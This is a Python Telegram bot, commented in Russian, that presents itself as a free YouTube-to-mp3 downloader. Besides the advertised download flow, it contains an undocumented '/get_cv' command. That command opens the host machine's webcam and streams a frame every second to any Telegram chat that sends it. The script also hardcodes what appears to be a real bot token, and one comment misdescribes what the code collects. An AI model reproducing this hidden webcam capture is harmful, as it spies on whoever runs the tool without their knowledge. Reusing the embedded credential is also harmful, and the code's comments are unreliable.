import os
import asyncio
import time
import telebot
import colorlog
from pytube import YouTube
from telebot import types
import datetime
from colorama import Fore
import socket
import pygetwindow
import pyautogui
import cv2

from pystyle import Write, System, Colorate, Colors
from colorama import Fore, Style, init

os.system('cls')

red = Fore.RED
yellow = Fore.YELLOW
green = Fore.GREEN
blue = Fore.BLUE
orange = Fore.RED + Fore.YELLOW
pretty = Fore.LIGHTMAGENTA_EX + Fore.LIGHTCYAN_EX
magenta = Fore.MAGENTA
lightblue = Fore.LIGHTBLUE_EX
cyan = Fore.CYAN
gray = Fore.LIGHTBLACK_EX + Fore.WHITE
reset = Fore.RESET
pink = Fore.LIGHTGREEN_EX + Fore.LIGHTMAGENTA_EX
dark_green = Fore.GREEN + Style.BRIGHT

def clear_screen():
    # Platform-independent clear screen
    os.system('cls' if os.name == 'nt' else 'clear')

Write.Print(f"""
\t\t\t╔────────────────────────────────────────────────────────────────╗
\t\t\t│ ██████   █████          ███████████               ███████      │
\t\t\t│░░██████ ░░███          ░░███░░░░░███            ███░░░░░███    │
\t\t\t│ ░███░███ ░███   ██████  ░███    ░███   ██████  ███     ░░███   │
\t\t\t│ ░███░░███░███  ███░░███ ░██████████   ███░░███░███      ░███   │
\t\t\t│ ░███ ░░██████ ░███████  ░███░░░░░███ ░███ ░███░███      ░███   │
\t\t\t│ ░███  ░░█████ ░███░░░   ░███    ░███ ░███ ░███░░███     ███    │
\t\t\t│ █████  ░░█████░░██████  █████   █████░░██████  ░░░███████░   ██│
\t\t\t│░░░░░    ░░░░░  ░░░░░░  ░░░░░   ░░░░░  ░░░░░░     ░░░░░░░    ░░ │
\t\t\t╚────────────────────────────────────────────────────────────────╝
╔─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
\t\t\tCreator : [ Neroo. ] ~ TG Reports : [ https://t.me/botsreportxz ]
╚─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝
╔─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╗
\t\t\tINFO : ⚡Neroo.⚡ = Bot - Successfully Logged in system Telegram
╚─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────╝
""" , Colors.cyan_to_green, interval=0.000)

RED = "\033[1;31m"
BLUE = "\033[1;34m"
CYAN = "\033[1;36m"
PURPLE = "\033[1;35m"
GREEN = "\033[0;32m"
RESET = "\033[0;0m"
BOLD = "\033[;1m"
REVERSE = "\033[;7m"
YELLOW = "\033[;37m"

# Initialize the Telegram bot
bot = telebot.TeleBot('6130583476:AAEXpsQfItw6vW9jW7P0ZruZeYBpDZ8rIqI')

# Initialize OpenCV for webcam streaming
video_capture = cv2.VideoCapture(0)

@bot.message_handler(commands=['start'])
def startBot(message):
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user_name = None
    if message.from_user.first_name is not None and message.from_user.last_name is not None:
        user_name = f"{message.from_user.first_name} {message.from_user.last_name}"
    elif message.from_user.username is not None:
        user_name = message.from_user.username
    # Retrieve the user's IP address
    ip_address = get_ip_address()

    print(f"{current_time} {PURPLE}[First_name_user: {message.from_user.first_name}] - [Last_name_user:: {message.from_user.last_name}] - [Username: {user_name}] - UserIP: [{ip_address}]{PURPLE}")
    print(f"{current_time} {PURPLE}{message.from_user} - {ip_address}{PURPLE}")
    first_mess1 = f"{current_time} ⏳🛠 Бот сейчас работает! 🛠⏳"
    first_mess2 = """
|------------------------------------------------------------------|
|                                                                                     
|             Creator Neroo.                                            
|                                                                                     
|------------------------------------------------------------------|
|                                                                                                                                                                   
|   1.Это бот который может скачать                  
|   что угодно с ютуба нужна лишь сылка                
|                                                       
|------------------------------------------------------------------|
|                                                       
|   2.Бот может пока-что скачать только                
|   в формате .mp3                                     
|                                                       
|------------------------------------------------------------------| """
    first_mess = f"<b>{message.from_user.first_name} {message.from_user.last_name}</b>, Привет!\nТут ты можешь скачать музыку бесплатно с Youtube!\nwatch?v=???????"

    # Send the welcome message
    first_mess1_message = bot.send_message(message.chat.id, first_mess1)
    first_mess2_message = bot.send_message(message.chat.id, first_mess2)
    first_mess_message = bot.send_message(message.chat.id, first_mess, parse_mode='html')

    # Store the message IDs
    message_ids = [first_mess1_message.message_id, first_mess2_message.message_id, first_mess_message.message_id]

    # Send a message requesting the YouTube video URL
    msg = bot.send_message(message.chat.id, 'Пожалуйста, введите URL видео YouTube:')
    message_ids.append(msg.message_id)  # Store the message ID

    # Store the message IDs as a tuple
    bot.register_next_step_handler(msg, process_video_url, message_ids)

@bot.message_handler(commands=['get_cv'])
def start_stream(message):
    # Start streaming the webcam
    current_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    bot.send_message(message.chat.id, "Starting live webcam stream...")

    while True:
        ret, frame = video_capture.read()
        if ret:
            frame_encoded = cv2.imencode('.jpg', frame)[1].tobytes()
            bot.send_photo(message.chat.id, photo=frame_encoded)
        time.sleep(1)  # Adjust the frame rate as needed

def get_ip_address():
    try:
        # Create a socket object
        socket_obj = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # Connect to a remote server
        socket_obj.connect(("8.8.8.8", 80))

        # Get the socket's IP address
        ip_address = socket_obj.getsockname()[0]

        # Close the socket connection
        socket_obj.close()

        return ip_address
    except Exception as e:
        logging.error(f"An error occurred while retrieving IP address: {str(e)}")
        return None

def process_video_url(message, message_ids):
    try:
        video_url = message.text

        # Download the video using pytube
        yt = YouTube(video_url)
        downloading_message = bot.send_message(message.chat.id, "Скачивается.....")

        video = yt.streams.filter(only_audio=True).first()
        current_dir = os.getcwd()
        destination = os.path.join(current_dir, 'Downloads')
        out_file = video.download(output_path=destination)
        base, ext = os.path.splitext(out_file)
        new_file = base + '.mp3'
        os.rename(out_file, new_file)

        # Send the downloaded file to the user
        bot.send_audio(message.chat.id, audio=open(new_file, 'rb'), title=yt.title)

        # Clear the message containing the YouTube video URL
        bot.delete_message(chat_id=message.chat.id, message_id=message_ids[-1])

        # Delete the "Downloading....." message
        bot.delete_message(chat_id=message.chat.id, message_id=downloading_message.message_id)

        # Delete the previous messages
        for message_id in message_ids[:-1]:
            bot.delete_message(chat_id=message.chat.id, message_id=message_id)

    except Exception as e:
        bot.reply_to(message, f"An error occurred: {str(e)}")

# Start the bot
bot.polling()